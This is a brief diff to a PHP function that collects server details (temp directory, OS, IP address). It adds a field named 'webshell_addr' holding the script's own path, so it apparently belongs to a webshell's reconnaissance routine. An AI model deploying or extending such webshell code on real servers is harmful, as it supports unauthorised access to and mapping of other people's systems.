@@ -10,6 +10,7 @@ function run($vars){
         'tmpdir'=>sys_get_temp_dir(),
         'sep'=>DIRECTORY_SEPARATOR,
         'os_bit'=>32,
+        'webshell_addr'=>$_SERVER['SCRIPT_FILENAME'],
         'ip_addr'=>$_SERVER['SERVER_ADDR']
     );
     if(strpos(strtoupper(PHP_OS), "WIN")===false){
